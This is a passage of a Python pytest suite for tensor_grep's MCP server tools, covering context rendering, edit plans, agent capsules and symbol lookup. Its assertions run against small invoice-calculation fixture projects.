        "def create_invoice(total, tax):\n"
        "    return total + tax\n",
        encoding="utf-8",
    )
    other_path = src_dir / "users.py"
    other_path.write_text("def load_user(user_id):\n    return user_id\n", encoding="utf-8")
    test_path = tests_dir / "test_payments.py"
    test_path.write_text("from src.payments import create_invoice\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_context_pack("invoice payment", str(project)))

    assert payload["version"] == 1
    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "context-pack"
    assert payload["sidecar_used"] is False
    assert (
        payload["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert payload["query"] == "invoice payment"
    assert payload["path"] == str(project.resolve())
    assert payload["files"][0] == str(module_path.resolve())


def test_tg_context_render_returns_prompt_ready_context(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "class PaymentService:\n"
        "    pass\n\n"
        "def create_invoice(total, tax):\n"
        "    return total + tax\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_payments.py"
    test_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def test_create_invoice():\n"
        "    assert create_invoice(1, 2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_context_render("create invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "context-render"
    assert payload["files"][0] == str(module_path.resolve())
    assert payload["sources"][0]["name"] == "create_invoice"
    assert any(section["kind"] == "tests" for section in payload["sections"])
    assert any(section["kind"] == "source" for section in payload["sections"])
    summary_section = next(
        section for section in payload["sections"] if section["kind"] == "summary"
    )
    source_section = next(section for section in payload["sections"] if section["kind"] == "source")
    assert summary_section["provenance"]["path"] == str(module_path.resolve())
    assert "symbol" in summary_section["provenance"]["reasons"]
    assert source_section["provenance"]["symbol"] == "create_invoice"
    assert source_section["provenance"]["symbol_score"] >= 1
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["candidate_edit_targets"]["files"][0] == str(module_path.resolve())
    assert payload["candidate_edit_targets"]["symbols"][0]["name"] == "create_invoice"
    assert payload["candidate_edit_targets"]["ranking_quality"] == payload["ranking_quality"]
    assert payload["candidate_edit_targets"]["coverage_summary"] == payload["coverage_summary"]
    assert payload["edit_plan_seed"]["primary_file"] == str(module_path.resolve())
    assert payload["edit_plan_seed"]["primary_symbol"]["name"] == "create_invoice"
    assert payload["edit_plan_seed"]["primary_test"] == str(test_path.resolve())
    assert payload["edit_plan_seed"]["validation_tests"] == [str(test_path.resolve())]
    assert payload["edit_plan_seed"]["validation_commands"] == [
        "uv run pytest tests/test_payments.py -k test_create_invoice -q",
        "uv run pytest tests/test_payments.py -q",
        "uv run pytest -q",
    ]
    _assert_enriched_edit_plan_seed(
        payload["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    assert payload["edit_plan_seed"]["confidence"]["file"] >= 0.5
    assert payload["edit_plan_seed"]["confidence"]["symbol"] >= 0.5
    assert payload["edit_plan_seed"]["confidence"]["test"] >= 0.5
    assert str(module_path.resolve()) in payload["rendered_context"]
    assert "create_invoice" in payload["rendered_context"]


def test_tg_context_render_profile_includes_profiling_without_changing_output(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    (src_dir / "payments.py").write_text(
        "class PaymentService:\n"
        "    pass\n\n"
        "def create_invoice(total, tax):\n"
        "    return total + tax\n",
        encoding="utf-8",
    )
    (tests_dir / "test_payments.py").write_text(
        "from src.payments import create_invoice\n\n"
        "def test_create_invoice():\n"
        "    assert create_invoice(1, 2) == 3\n",
        encoding="utf-8",
    )

    baseline = json.loads(mcp_server.tg_context_render("create invoice", str(project)))
    profiled = json.loads(
        mcp_server.tg_context_render(
            "create invoice",
            str(project),
            profile=True,
        )
    )

    assert "_profiling" not in baseline
    assert profiled["_profiling"]["phases"]
    assert _without_profiling(profiled) == baseline


def test_tg_context_render_includes_exact_caller_update_lines(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total):\n    return total + 1\n",
        encoding="utf-8",
    )
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n"
        "\n"
        "def build_receipt(total):\n"
        "    first = create_invoice(total)\n"
        "    return create_invoice(first)\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_context_render("create invoice", str(project)))

    caller_updates = [
        dict(current)
        for current in payload["edit_plan_seed"]["suggested_edits"]
        if current["file"] == str(service_path.resolve())
        and current["edit_kind"] == "caller-update"
    ]
    assert [
        (entry["symbol"], entry["start_line"], entry["end_line"]) for entry in caller_updates
    ] == [
        ("build_receipt", 4, 4),
        ("build_receipt", 5, 5),
    ]
    for entry in caller_updates:
        assert entry["provenance"] == "python-ast"
        assert 0.0 < entry["confidence"] <= 1.0
        assert f"calls create_invoice() on line {entry['start_line']}" in entry["rationale"]


def test_tg_context_render_mcp_preserves_invoice_tax_body_and_primary_target(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    payments_path = src_dir / "payments.py"
    payments_path.write_text(
        "TAX_RATE = 0.0825\n\n"
        "def create_invoice(subtotal: float) -> dict[str, float]:\n"
        "    tax = subtotal * TAX_RATE\n"
        "    total = subtotal + tax\n"
        '    return {"subtotal": subtotal, "tax": tax, "total": total}\n',
        encoding="utf-8",
    )
    (src_dir / "app.ts").write_text(
        "export function createInvoice(subtotal: number) {\n  return { subtotal };\n}\n",
        encoding="utf-8",
    )
    (tests_dir / "test_payments.py").write_text(
        "from src.payments import create_invoice\n\n"
        "def test_create_invoice():\n"
        '    assert create_invoice(100.0)["tax"] > 0\n',
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_context_render(
            "change invoice tax calculation",
            str(project),
            render_profile="llm",
        )
    )

    assert payload["edit_plan_seed"]["primary_file"] == str(payments_path.resolve())
    assert payload["navigation_pack"]["primary_target"]["file"] == str(payments_path.resolve())
    assert payload["sources"][0]["file"] == str(payments_path.resolve())
    assert "tax = subtotal * TAX_RATE" in payload["sources"][0]["rendered_source"]
    assert payload["context_consistency"]["primary_file_included"] is True


def test_tg_agent_capsule_returns_actionable_context_capsule(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    subtotal = total + tax\n    return subtotal\n",
        encoding="utf-8",
    )
    (tests_dir / "test_payments.py").write_text(
        "from src.payments import create_invoice\n\n"
        "def test_create_invoice():\n"
        "    assert create_invoice(1, 2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_agent_capsule(
            "change invoice tax calculation",
            str(project),
            max_tokens=160,
        )
    )

    assert payload["routing_reason"] == "agent-context-capsule"
    assert payload["capsule_kind"] == "actionable_context"
    assert payload["primary_target"]["file"] == str(module_path.resolve())
    assert payload["primary_target"]["symbol"] == "create_invoice"
    assert payload["snippets"][0]["file"] == str(module_path.resolve())
    assert "subtotal = total + tax" in payload["snippets"][0]["source"]
    assert payload["snippets"][0]["line_map"][0]["line"] == 1
    assert payload["validation_commands"]
    assert payload["rollback"]["checkpoint_recommended"] is True
    assert payload["omissions"]["token_budget"] == 160
    assert "follow_up_reads" in payload["omissions"]
    assert payload["raw_context_ref"]["command"].startswith("tg context-render")
    assert payload["ask_user_before_editing"]["required"] is False


def test_tg_agent_capsule_accepts_gpu_evidence_options(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import agent_capsule, mcp_server

    project = tmp_path / "project"
    project.mkdir()
    (project / "app.py").write_text(
        "def create_invoice(total):\n    return total\n",
        encoding="utf-8",
    )

    def _fake_gpu_run(command, **_kwargs):
        payload = {
            "routing_backend": "GpuSidecar",
            "routing_reason": "gpu-device-ids-explicit",
            "sidecar_used": True,
            "total_matches": 1,
            "matches": [{"file": "probe.log", "line": 1, "text": "probe"}],
        }
        return CompletedProcess(command, 0, json.dumps(payload), "")

    monkeypatch.setattr(agent_capsule.subprocess, "run", _fake_gpu_run)

    payload = json.loads(
        mcp_server.tg_agent_capsule(
            "change invoice tax calculation",
            str(project),
            gpu_device_ids=[0, 1],
            gpu_timeout_s=1,
        )
    )

    acceleration = payload["gpu_acceleration"]
    assert acceleration["requested_device_ids"] == [0, 1]
    assert acceleration["status"] == "unsupported"
    assert acceleration["routing_backend"] == "GpuSidecar"
    assert acceleration["sidecar_used"] is True


def test_tg_agent_capsule_returns_invalid_input_for_missing_path(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(
        mcp_server.tg_agent_capsule(
            "change invoice tax calculation",
            str(tmp_path / "missing"),
        )
    )

    assert payload["routing_reason"] == "agent-context-capsule"
    assert payload["error"]["code"] == "invalid_input"
    assert "Path not found" in payload["error"]["message"]


def test_tg_edit_plan_returns_machine_readable_plan_bundle(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "class PaymentService:\n"
        "    pass\n\n"
        "def create_invoice(total, tax):\n"
        "    return total + tax\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_payments.py"
    test_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def test_create_invoice():\n"
        "    assert create_invoice(1, 2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_edit_plan(
            "create invoice",
            str(project),
            max_files=2,
            max_repo_files=2,
            max_sources=1,
            max_tokens=64,
        )
    )

    assert payload["routing_reason"] == "context-edit-plan"
    assert payload["max_files"] == 2
    assert payload["scan_limit"]["max_repo_files"] == 2
    assert payload["max_sources"] == 1
    assert payload["max_tokens"] == 64
    assert "rendered_context" not in payload
    assert "sources" not in payload
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["candidate_edit_targets"]["files"][0] == str(module_path.resolve())
    assert payload["candidate_edit_targets"]["spans"][0]["file"] == str(module_path.resolve())
    assert payload["candidate_edit_targets"]["spans"][0]["symbol"] == "create_invoice"
    assert payload["candidate_edit_targets"]["ranking_quality"] == payload["ranking_quality"]
    assert payload["candidate_edit_targets"]["coverage_summary"] == payload["coverage_summary"]
    _assert_enriched_edit_plan_seed(
        payload["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    _assert_navigation_pack(
        payload["navigation_pack"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    assert payload["primary_target"] == payload["navigation_pack"]["primary_target"]
    assert payload["edit_order"] == payload["edit_plan_seed"]["edit_ordering"]
    assert payload["plan"]["primary_file"] == str(module_path.resolve())
    assert payload["plan"]["primary_symbol"]["name"] == "create_invoice"
    assert "rendered_context" not in payload["plan"]


def test_tg_edit_plan_prefers_targeted_vitest_validation_commands(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    (project / "package.json").write_text(
        json.dumps({
            "name": "vitest-project",
            "devDependencies": {"vitest": "^1.0.0"},
        }),
        encoding="utf-8",
    )
    module_path = src_dir / "payments.ts"
    module_path.write_text(
        "export function createInvoice(total: number, tax: number): number {\n"
        "  return total + tax;\n"
        "}\n",
        encoding="utf-8",
    )
    (tests_dir / "payments.test.ts").write_text(
        'import { describe, expect, test } from "vitest";\n'
        'import { createInvoice } from "../src/payments";\n\n'
        'describe("payments", () => {\n'
        '  test("createInvoice adds tax", () => {\n'
        "    expect(createInvoice(1, 2)).toBe(3);\n"
        "  });\n"
        "});\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_edit_plan("create invoice", str(project)))

    assert payload["candidate_edit_targets"]["spans"][0]["file"] == str(module_path.resolve())
    assert payload["edit_plan_seed"]["validation_plan"][0]["runner"] == "vitest"
    assert payload["edit_plan_seed"]["validation_plan"][0]["scope"] == "symbol"
    assert payload["edit_plan_seed"]["validation_plan"][0]["command"] == (
        'npx vitest run tests/payments.test.ts -t "createInvoice adds tax"'
    )
    assert payload["edit_plan_seed"]["validation_commands"][0] == (
        'npx vitest run tests/payments.test.ts -t "createInvoice adds tax"'
    )


def test_tg_context_render_honors_max_render_chars(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n"
        "    subtotal = total + tax\n"
        "    fee = subtotal + 5\n"
        "    grand_total = fee + 10\n"
        "    return grand_total\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_context_render("create invoice", str(project), max_render_chars=120)
    )

    assert payload["truncated"] is True
    assert payload["max_render_chars"] == 120
    assert len(payload["rendered_context"]) <= 120
    assert payload["sources"][0]["name"] == "create_invoice"


def test_tg_context_render_accepts_max_tokens_and_model(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n"
        "    subtotal = total + tax\n"
        "    fee = subtotal + 5\n"
        "    grand_total = fee + 10\n"
        "    return grand_total\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_context_render(
            "create invoice",
            str(project),
            max_files=1,
            max_sources=1,
            max_tokens=40,
            model="gpt-test",
        )
    )

    assert payload["files"][0] == str(module_path.resolve())
    assert payload["max_tokens"] == 40
    assert payload["model"] == "gpt-test"
    assert isinstance(payload["token_estimate"], int)
    assert all(isinstance(section["token_estimate"], int) for section in payload["sections"])
    assert payload["token_estimate"] <= 40 + max(
        (section["token_estimate"] for section in payload["sections"]),
        default=0,
    )


def test_tg_context_render_can_optimize_source_blocks_for_llm_use(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "# module comment\n"
        "\n"
        "def create_invoice(total, tax):\n"
        "    # subtotal comment\n"
        "    subtotal = total + tax\n"
        "\n"
        "    return subtotal\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_context_render(
            "create invoice",
            str(project),
            optimize_context=True,
            render_profile="llm",
        )
    )

    assert payload["optimize_context"] is True
    assert payload["render_profile"] == "llm"
    source = next(item for item in payload["sources"] if item["name"] == "create_invoice")
    assert "# subtotal comment" not in source["rendered_source"]
    assert "\n\n" not in source["rendered_source"]
    assert source["line_map"][0]["original_start_line"] == 3
    assert source["line_map"][0]["rendered_start_line"] == 1
    assert source["render_diagnostics"]["removed_comment_lines"] >= 1
    assert source["render_diagnostics"]["removed_blank_lines"] >= 1
    assert "create_invoice" in payload["rendered_context"]


def test_tg_context_render_strips_python_docstrings_and_pass_boilerplate(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "class PaymentService:\n"
        '    """Service docstring."""\n'
        "    pass\n\n"
        "def create_invoice(total, tax):\n"
        '    """Create an invoice."""\n'
        "    subtotal = total + tax\n"
        "    return subtotal\n",
        encoding="utf-8",
    )

    class_payload = json.loads(
        mcp_server.tg_context_render(
            "payment service",
            str(project),
            optimize_context=True,
            render_profile="compact",
        )
    )
    function_payload = json.loads(
        mcp_server.tg_context_render(
            "create invoice",
            str(project),
            optimize_context=True,
            render_profile="compact",
        )
    )

    payment_service = next(
        item for item in class_payload["sources"] if item["name"] == "PaymentService"
    )
    create_invoice = next(
        item for item in function_payload["sources"] if item["name"] == "create_invoice"
    )

    assert '"""Service docstring."""' not in payment_service["rendered_source"]
    assert "pass" not in payment_service["rendered_source"]
    assert payment_service["render_diagnostics"]["removed_docstring_lines"] >= 1
    assert payment_service["render_diagnostics"]["removed_boilerplate_lines"] >= 1

    assert '"""Create an invoice."""' not in create_invoice["rendered_source"]
    assert "subtotal = total + tax" in create_invoice["rendered_source"]
    assert create_invoice["line_map"][0]["original_start_line"] == 5
    assert create_invoice["line_map"][0]["rendered_start_line"] == 1


def test_tg_session_context_render_accepts_max_tokens_and_model(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text(
        "def add(x):\n    baseline = x + 1\n    return baseline\n",
        encoding="utf-8",
    )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    rendered = json.loads(
        mcp_server.tg_session_context_render(
            session_id,
            "add",
            str(project),
            max_files=1,
            max_sources=1,
            max_tokens=32,
            model="gpt-test",
        )
    )

    assert rendered["session_id"] == session_id
    assert rendered["files"][0] == str(sample_path.resolve())
    assert rendered["max_tokens"] == 32
    assert rendered["model"] == "gpt-test"
    assert isinstance(rendered["token_estimate"], int)
    assert rendered["omitted_sections"] == [] or all(
        {"file", "symbol", "score", "token_estimate"} <= set(section)
        for section in rendered["omitted_sections"]
    )


def test_tg_symbol_defs_returns_exact_definition_matches(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_defs("create_invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-defs"
    assert (
        payload["coverage"]["language_scope"]
        == "c-cpp-csharp-go-java-javascript-php-python-rust-typescript"
    )
    assert payload["symbol"] == "create_invoice"
    assert len(payload["definitions"]) == 1
    assert payload["definitions"][0]["file"] == str(module_path.resolve())
    assert payload["definitions"][0]["provenance"] == "python-ast"
    assert payload["graph_completeness"] == "strong"


def test_tg_symbol_defs_can_find_rust_and_typescript_symbols(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )

    ts_payload = json.loads(mcp_server.tg_symbol_defs("createInvoice", str(project)))
    rust_payload = json.loads(mcp_server.tg_symbol_defs("issue_invoice", str(project)))

    assert (
        ts_payload["coverage"]["language_scope"]
        == "c-cpp-csharp-go-java-javascript-php-python-rust-typescript"
    )
    assert ts_payload["definitions"][0]["file"] == str(ts_path.resolve())
    assert ts_payload["definitions"][0]["kind"] == "function"
    assert rust_payload["definitions"][0]["file"] == str(rust_path.resolve())
    assert rust_payload["definitions"][0]["kind"] == "function"


def test_tg_symbol_source_returns_exact_python_function_body(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    subtotal = total + tax\n    return subtotal\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_source("create_invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-source"
    assert payload["symbol"] == "create_invoice"
    assert payload["definitions"][0]["file"] == str(module_path.resolve())
    assert payload["sources"][0]["start_line"] == 1
    assert payload["sources"][0]["end_line"] == 3
    assert "subtotal = total + tax" in payload["sources"][0]["source"]


def test_tg_symbol_source_can_extract_typescript_and_rust_blocks(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "export function createInvoice(total: number) {\n"
        "  const subtotal = total + 1;\n"
        "  return subtotal;\n"
        "}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "pub fn issue_invoice() -> usize {\n    let subtotal = 1;\n    subtotal\n}\n",
        encoding="utf-8",
    )

    ts_payload = json.loads(mcp_server.tg_symbol_source("createInvoice", str(project)))
    rust_payload = json.loads(mcp_server.tg_symbol_source("issue_invoice", str(project)))

    assert ts_payload["sources"][0]["file"] == str(ts_path.resolve())
    assert "const subtotal = total + 1;" in ts_payload["sources"][0]["source"]
    assert rust_payload["sources"][0]["file"] == str(rust_path.resolve())
    assert "let subtotal = 1;" in rust_payload["sources"][0]["source"]


def test_tg_symbol_impact_returns_related_files_and_tests(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    other_path = src_dir / "billing.py"
    other_path.write_text(
        "from src.payments import create_invoice\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_payments.py"
    test_path.write_text(
        "from src.payments import create_invoice\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_impact("create_invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-impact"
    assert (
        payload["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert payload["symbol"] == "create_invoice"
    assert payload["files"][0] == str(module_path.resolve())
    assert str(other_path.resolve()) in payload["files"]
    assert payload["tests"][0] == str(test_path.resolve())
    assert any(
        entry["file"] == str(other_path.resolve()) and entry["provenance"] == "python-ast"
        for entry in payload["imports"]
    )


def test_tg_symbol_impact_uses_bounded_repo_scan_by_default(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    seen: dict[str, object] = {}

    def _fake_build_symbol_impact(
        symbol,
        path=".",
        *,
        semantic_provider="native",
        max_repo_files=None,
        deadline_seconds=None,
    ):
        seen["symbol"] = symbol
        seen["path"] = path
        seen["semantic_provider"] = semantic_provider
        seen["max_repo_files"] = max_repo_files
        seen["deadline_seconds"] = deadline_seconds
        return {
            "version": 1,
            "routing_backend": "RepoMap",
            "routing_reason": "symbol-impact",
            "sidecar_used": False,
            "symbol": symbol,
            "path": str(path),
            "files": [],
            "tests": [],
            "scan_limit": {
                "max_repo_files": max_repo_files,
                "scanned_files": 0,
                "possibly_truncated": False,
            },
        }

    monkeypatch.setattr(mcp_server, "build_symbol_impact", _fake_build_symbol_impact)

    payload = json.loads(mcp_server.tg_symbol_impact("safeParseJSON", str(tmp_path)))

    # Cluster A cap-value decision (Fable completeness review): the MCP default was raised
    # 512 -> 2000 to match the CLI's routing-accuracy default; tg_symbol_impact's *behavior*
    # (forwarding the shared default) is unchanged, so assert against the constant rather
    # than a value that would silently go stale on the next cap-value change.
    assert payload["scan_limit"]["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT
    assert seen["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT


def test_tg_symbol_impact_prefers_import_linked_typescript_and_rust_tests(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )
    ts_test_path = tests_dir / "invoice_flow.spec.ts"
    ts_test_path.write_text(
        'import { createInvoice } from "../src/payments";\n'
        "test('invoice', () => expect(createInvoice(1)).toBe(1));\n",
        encoding="utf-8",
    )
    rust_test_path = tests_dir / "integration_checks.rs"
    rust_test_path.write_text(
        "use crate::billing::issue_invoice;\n\n"
        "#[test]\n"
        "fn invoice_smoke() {\n"
        "    assert_eq!(issue_invoice(), 1);\n"
        "}\n",
        encoding="utf-8",
    )

    ts_payload = json.loads(mcp_server.tg_symbol_impact("createInvoice", str(project)))
    rust_payload = json.loads(mcp_server.tg_symbol_impact("issue_invoice", str(project)))

    assert ts_payload["coverage"]["test_matching"] == "filename+import+graph-heuristic"
    assert ts_payload["tests"][0] == str(ts_test_path.resolve())
    assert rust_payload["tests"][0] == str(rust_test_path.resolve())


def test_tg_symbol_impact_prefers_import_linked_source_files_over_name_only_matches(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    notes_dir = project / "notes"
    src_dir.mkdir(parents=True)
    notes_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    importer_path = src_dir / "billing.py"
    importer_path.write_text(
        "from src.payments import create_invoice\n\ndef bill():\n    return create_invoice(1, 2)\n",
        encoding="utf-8",
    )
    noisy_path = notes_dir / "invoice_notes.py"
    noisy_path.write_text("def placeholder():\n    return 'invoice'\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_symbol_impact("create_invoice", str(project)))

    assert payload["files"][0] == str(module_path.resolve())
    assert payload["files"][1] == str(importer_path.resolve())
    assert str(noisy_path.resolve()) not in payload["files"][:2]


def test_tg_context_pack_prefers_import_linked_files_for_ranked_symbol_queries(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    notes_dir = project / "notes"
    src_dir.mkdir(parents=True)
    notes_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    importer_path = src_dir / "billing.py"
    importer_path.write_text(
        "from src.payments import create_invoice\n\ndef bill():\n    return create_invoice(1, 2)\n",
        encoding="utf-8",
    )
    noisy_path = notes_dir / "invoice_notes.py"
    noisy_path.write_text("def placeholder():\n    return 'invoice'\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_context_pack("create invoice", str(project)))

    assert payload["files"][0] == str(module_path.resolve())
    assert payload["files"][1] == str(importer_path.resolve())
    assert str(noisy_path.resolve()) not in payload["files"][:2]
    assert payload["file_matches"][0]["path"] == str(module_path.resolve())
    assert "symbol" in payload["file_matches"][0]["reasons"]
    assert "definition" in payload["file_matches"][0]["reasons"]
    assert payload["file_matches"][1]["path"] == str(importer_path.resolve())
    assert "import" in payload["file_matches"][1]["reasons"]
    assert any(
        entry["file"] == str(importer_path.resolve()) and entry["provenance"] == "python-ast"
        for entry in payload["imports"]
    )
    assert payload["file_summaries"][0]["path"] == str(module_path.resolve())
    assert {item["name"] for item in payload["file_summaries"][0]["symbols"]} == {"create_invoice"}


def test_tg_symbol_refs_returns_python_reference_sites(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    other_path = src_dir / "billing.py"
    other_path.write_text(
        "from src.payments import create_invoice\n\nresult = create_invoice(10, 2)\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_refs("create_invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-refs"
    assert (
        payload["coverage"]["symbol_navigation"]
